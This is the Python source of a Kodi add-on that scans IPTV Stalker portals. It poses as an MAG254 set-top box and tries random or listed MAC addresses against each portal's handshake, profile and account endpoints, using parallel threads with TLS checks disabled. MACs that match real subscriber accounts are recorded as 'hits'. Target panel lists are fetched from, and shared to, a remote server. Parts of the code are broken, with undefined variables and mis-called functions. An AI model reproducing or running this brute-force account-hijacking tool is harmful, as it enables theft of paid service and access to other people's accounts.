import datetime, os, xbmcvfs
import socket, hashlib
import json, random, sys, time, re
import requests
import xbmcgui
import threading
import subprocess
import pathlib
import base64, time, shutil, logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib.request
import urllib.parse, urllib.error
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS=(
"TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:"
"TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:"
"TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:"
"TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:"
"TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:"
"TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:"
"TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:"
"TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:"
"TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:"
"TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:"
"TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
dialog = xbmcgui.Dialog()
HOME = xbmcvfs.translatePath('special://home/')
dir_combo = os.path.join(HOME, 'addons/script.linxscanner/combo/')
hits_dir = os.path.join(HOME, 'addons/script.linxscanner/Hits/')
USER_SHARED_PANELS_URL = "https://log.greenb00k.org/link1.txt"
DEFAULT_PANELS_URL     = "https://log.greenb00k.org/jetin/link2.txt"
UPLOAD_LINK1_PHP       = "https://log.greenb00k.org/upload_link1.php"

first_names = [
    'John', 'Jane', 'Alex', 'Emily', 'Michael', 'Sarah', 'David', 'Laura',
    'Chris', 'Jessica', 'James', 'Olivia', 'Robert', 'Emma', 'Daniel', 'Sophia'
]

last_names = [
    'Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson',
    'Moore', 'Taylor', 'Anderson', 'Thomas', 'Jackson', 'White', 'Harris', 'Martin'
]
pattern= "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
portaltip = "portal.php"
ses = requests.Session()

def fetch_panel_list(url):
    """Fetch a list of panels from a remote URL (line by line)."""
    try:
        with urllib.request.urlopen(url) as response:
            file_content = response.read().decode('utf-8')
        lines = file_content.strip().split('\n')
        
        lines = [x.strip() for x in lines if x.strip()]
        return lines
    except Exception as e:
        xbmcgui.Dialog().ok("Error", f"Failed to fetch: {url}\n{e}")
        return []

def upload_new_url_to_link1(new_url):
    """
    Poziv server-side skripte koja append-a new_url u link1.txt.
    Pretpostavlja da upload_link1.php prima POST param 'url'.
    """
    try:
        resp = requests.post(UPLOAD_LINK1_PHP, data={"url": new_url}, timeout=10)
        if resp.status_code == 200:
            xbmcgui.Dialog().ok("Upload Result", f"Server response:\n{resp.text}")
        else:
            xbmcgui.Dialog().ok("Upload Error", f"HTTP {resp.status_code}\n{resp.text}")
    except Exception as e:
        xbmcgui.Dialog().ok("Upload Exception", str(e))

def month_string_to_number(ay):
    m = {
        'jan': 1,
        'feb': 2,
        'mar': 3,
        'apr':4,
        'may':5,
        'jun':6,
        'jul':7,
        'aug':8,
        'sep':9,
        'oct':10,
        'nov':11,
        'dec':12
    }
    s = ay.strip()[:3].lower()
    out = m[s]
    return out

def tarih_clear(trh):
    from datetime import date
    ay=str(trh.split(' ')[0])
    gun=str(trh.split(', ')[0].split(' ')[1])
    yil=str(trh.split(', ')[1])
    ay=str(month_string_to_number(ay))
    d = date(int(yil), int(ay), int(gun))
    sontrh = time.mktime(d.timetuple())
    out=(int((sontrh-time.time())/86400))
    return out
    
hits_filename = ""
Dosyab = ""

def yax(hits):
    """Upis HIT-ova u .txt fajl (csv format)."""
    file_exists = os.path.isfile(Dosyab)
    file_is_empty = False
    if file_exists:
        file_is_empty = (os.path.getsize(Dosyab) == 0)
    with open(Dosyab, 'a+', encoding='utf-8') as dosya:
        if not file_exists or file_is_empty:
            dosya.write('Name;URL;MAC\n')
        dosya.write(hits + '\n')


def generate_random_name():
    fn = random.choice(first_names)
    ln = random.choice(last_names)
    return f'{fn} {ln}'
dsyno = ""
totLen = []
uz = 0
display_options = []
combo_files = []
STOPFLAG = xbmcvfs.translatePath(
    'special://home/addons/script.linxscanner/stopflag.txt'
)

def hea1(macs, panel):
    HEADERA = {
        "User-Agent":"Mozilla/5.0 (QtEmbedded; U; Linux; C)...",
        "Referer": "http://"+panel+"/c/" ,
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
        "Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate" ,
        "Connection": "Keep-Alive" ,
        "X-User-Agent":"Model: MAG254; Link: Ethernet",
    }
    return HEADERA

def hea2(macs, token, panel):
    HEADERd = {
        "User-Agent":"Mozilla/5.0 ...",
        "Referer": "http://"+panel+"/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent":"Model: MAG254; Link: Ethernet",
        "Authorization": "Bearer "+token,
    }
    return HEADERd

def hea3(panel):
    hea = {
        "Icy-MetaData": "1",
        "User-Agent": "Lavf/57.83.100",
        "Accept-Encoding": "identity",
        "Host": panel,
        "Accept": "*/*",
        "Range": "bytes=0-",
        "Connection": "close",
    }
    return hea

hityaz = 0

def m3uapi(playerlink, macs, token, panel):
    """Pribavljanje informacija iz player_api.php, po želji."""
    mt=""
    bag=0
    while True:
        try:
            res = ses.get(playerlink, headers=hea2(macs,token,panel), timeout=7, verify=False)
            veri=str(res.text)
            break
        except:
            bag+=1
            time.sleep(1)
            if bag==6:
                break
    return mt

def hit(mac, trh,livelist, vodlist, serieslist, playerapi,panel):
    global hityaz
    try:
        random_name = generate_random_name()
        imza = f"{random_name};http://{panel};{mac}\n"
        if kanalkata == "1":
            imza += f"LiveList: {livelist}\n"
        elif kanalkata == "2":
            imza += f"LiveList: {livelist}\n"
            imza += f"VodList: {vodlist}\nSeriesList: {serieslist}\n"

        hityaz += 1
        yax(imza)
    except Exception as e:
        logging.error(f"An error occurred in hit(): {e}")

def process_panel(panel):
    global uz, dsyno, totLen, botsay
    global url1, url2, url3, url6, liveurl, vodurl, seriesurl

    panel = panel.strip()
    if not panel:
        return

   
    if xbmcvfs.exists(STOPFLAG):
        xbmcvfs.delete(STOPFLAG)
        sys.exit()

    
    url1 = f"http://{panel}/{portaltip}?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"
    url2 = f"http://{panel}/{portaltip}?type=stb&action=get_profile&JsHttpRequest=1-xml"
    url3 = f"http://{panel}/{portaltip}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
    url6 = f"http://{panel}/{portaltip}?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

    liveurl   = f"http://{panel}/{portaltip}?action=get_genres&type=itv&JsHttpRequest=1-xml"
    vodurl    = f"http://{panel}/{portaltip}?action=get_categories&type=vod&JsHttpRequest=1-xml"
    seriesurl = f"http://{panel}/{portaltip}?action=get_categories&type=series&JsHttpRequest=1-xml"

    def url_gen(cid):
        return (f"http://{panel}/{portaltip}?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/{cid}_&"
                "series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml")

    progress_bg = xbmcgui.DialogProgressBG()
    progress_bg.create(f"Scanning panel: {panel}", "Initializing...")
    def worker(bot_id, start_offset):
        hitc = 0
        
        for index in range(start_offset, uz, botsay):
            if xbmcvfs.exists(STOPFLAG):
                xbmcvfs.delete(STOPFLAG)
                sys.exit()

            total = index
            if dsyno == "0":
                mac = randommac()
            else:
                if index >= uz:
                    break
                line = totLen[index].strip()
                macv_re = re.search(pattern, line, re.IGNORECASE)
                if macv_re:
                    mac = macv_re.group()
                else:
                    continue

            macs = mac.upper().replace(':', '%3A')
            bot = "Bot_" + str(bot_id)
            oran = round(((total) / (uz) * 100), 2)
            m3ulink = "" 
            playerapi=""
            livelist=""
            vodlist=""
            serieslist=""
            if not m3ulink=="":
                playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                
                playerapi=m3uapi(playerlink,macs,token)
                if playerapi=="":
                    playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                    playerapi=m3uapi(playerlink,macs,token)
           

            progress_bg.update(
                int(oran),
                message=f"Bot {bot_id} | MAC: {mac} | Hits: {hitc}"
            )

            
            bag = 0
            veri = ""
            while True:
                if xbmcvfs.exists(STOPFLAG):
                    xbmcvfs.delete(STOPFLAG)
                    sys.exit()

                try:
                    res = ses.get(url1, headers=hea1(macs, panel), timeout=15, verify=False)
                    veri = str(res.text)
                    break
                except:
                    bag += 1
                    time.sleep(1)
                    if bag == 12:
                        break

            if 'token' in veri:
                token = veri.replace('{"js":{"token":"', "").split('"')[0]
                bag = 0
                while True:
                    if xbmcvfs.exists(STOPFLAG):
                        xbmcvfs.delete(STOPFLAG)
                        sys.exit()

                    try:
                        res = ses.get(url2, headers=hea2(macs, token, panel), timeout=15, verify=False)
                        veri = str(res.text)
                        break
                    except:
                        bag += 1
                        time.sleep(1)
                        if bag == 12:
                            break

                id = "null"
                ip = ""
                try:
                    id = veri.split('{"js":{"id":')[1].split(',"name')[0]
                    ip = veri.split('ip":"')[1].split('"')[0]
                except:
                    pass

                if id != "null":
                    bag = 0
                    while True:
                        if xbmcvfs.exists(STOPFLAG):
                            xbmcvfs.delete(STOPFLAG)
                            sys.exit()

                        try:
                            res = ses.get(url3, headers=hea2(macs, token, panel), timeout=15, verify=False)
                            veri = str(res.text)
                            break
                        except:
                            bag += 1
                            time.sleep(1)
                            if bag == 12:
                                break

                    if 'phone' in veri:
                        hitc += 1
                        trh = ""
                        if 'end_date' in veri:
                            trh = veri.split('end_date":"')[1].split('"')[0]
                        else:
                            try:
                                trh = veri.split('phone":"')[1].split('"')[0]
                            except:
                                trh = ""

                        
                        hit(mac, trh,livelist, vodlist, serieslist, playerapi,panel)

    threads=[]
    for i in range(1,botsay+1):
        t=threading.Thread(target=worker, args=(i,i))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    progress_bg.close()
    dialog.ok("Finished", f"Completed scanning for: {panel}")

mactur = "00:1A:79:"

def randommac():
    genmac = str(mactur)+"%02x:%02x:%02x"% (
        (random.randint(0, 255)),
        (random.randint(0, 255)),
        (random.randint(0, 255))
    )
    return genmac

menu_options = [
    "Input Panel Manually",
    "Select Panels from the List",
]
menu_choice = dialog.select("Choose an option", menu_options)
if menu_choice == -1:
    dialog.ok("Cancelled", "No option selected.")
    sys.exit()

panel_list = []

if menu_choice == 0:
    
    single_panel = dialog.input("Enter the panel URL without /c/ or http:// e.g., panel:8080", type=xbmcgui.INPUT_ALPHANUM)
    if single_panel:
        single_panel = single_panel.strip()
        
        do_upload = dialog.yesno("Upload new URL?",
                                 f"Do you want to share this panel with other users?\n{single_panel}",
                                 yeslabel="YES - Upload", nolabel="NO")
        if do_upload:
            
            upload_new_url_to_link1(single_panel)
        
        panel_list = [single_panel]
    else:
        dialog.ok("No Input", "No panel was entered.")
        sys.exit()

elif menu_choice == 1:
   
    user_shared = fetch_panel_list(USER_SHARED_PANELS_URL)  
    
    default_panels = fetch_panel_list(DEFAULT_PANELS_URL)   

    if (not user_shared) and (not default_panels):
        dialog.ok("No Panels", "Failed to fetch or no panels found.")
        sys.exit()

    
    combined_list = []
    combined_list.append("[COLOR gold][B]USERS SHARED PANELS[/B][/COLOR]")
    if user_shared:
        combined_list.extend(user_shared)
    else:
        combined_list.append("(Nema user-shared URL-ova)")

    
    combined_list.append("[COLOR limegreen][B]DEFAULT PANELS[/B][/COLOR]")
    if default_panels:
        combined_list.extend(default_panels)
    else:
        combined_list.append("(Nema default URL-ova)")

    selected_indices = dialog.multiselect("Select Panels to Scan", combined_list)
    if (selected_indices is None) or (len(selected_indices) == 0):
        dialog.ok("No Selection", "No panels selected, exiting.")
        sys.exit()

    
    chosen_panels = []
    for i in selected_indices:
        val = combined_list[i]
        if val.startswith("[COLOR") or val.startswith("(Nema"):
            
            continue
        chosen_panels.append(val)

    if not chosen_panels:
        dialog.ok("Info", "All selected entries were either labels or '(None...)'.")
        sys.exit()

    
    green_list = "\n".join(f"[COLOR green]{p}[/COLOR]" for p in chosen_panels)
    dialog.ok("Selected Panels", f"Selected:\n{green_list}")
    panel_list = chosen_panels


if not os.path.exists(dir_combo):
    os.makedirs(dir_combo)

combo_files = os.listdir(dir_combo)
display_options = ["0= Random MAC"]
for i, files in enumerate(combo_files, start=1):
    display_options.append(str(i)+"= "+files)

selected_maclist_idx = dialog.select("Choose MAC combo", display_options)
dsyno = str(selected_maclist_idx)
if dsyno=="-1":
    dialog.ok("Info","No selection made, exiting.")
    sys.exit()

if dsyno=="0":
    
    yeninesil = (
        '00:1A:79:'
    )
    tipovi=[f"{i+1} » {val}" for i,val in enumerate(yeninesil)]
    sel_idx = dialog.select("Select Mac type", tipovi)
    if sel_idx == -1:
        sel_idx=0
    mactur=yeninesil[sel_idx]

    mac_count = dialog.input("How many MACs to Scan?", type=xbmcgui.INPUT_NUMERIC)
    if mac_count=="":
        mac_count="1000"
    uz=int(mac_count)

else:
    sel_num=int(dsyno)
    if sel_num>0 and sel_num<=len(combo_files):
        dosyaa=os.path.join(dir_combo, combo_files[sel_num-1])
        with open(dosyaa,'r',encoding='utf-8') as c:
            totLen = c.readlines()
        uz = len(totLen)
    else:
        dialog.ok("Error","Wrong combo file selection!")
        sys.exit()

hits_filename = dialog.input("Type the name of the new Hit File.", defaultt="linxlist")
if not os.path.exists(hits_dir):
    os.mkdir(hits_dir)
Dosyab = os.path.join(hits_dir, hits_filename+".txt")

botsay_input = dialog.input("BOTS? MAX 8", type=xbmcgui.INPUT_NUMERIC, defaultt="4")
if botsay_input=="":
    botsay=4
else:
    botsay=int(botsay_input)
kanalkata =0


for pnl in panel_list:
    process_panel(pnl)

dialog.ok("All Done", "Scanning of the selected panels is complete.")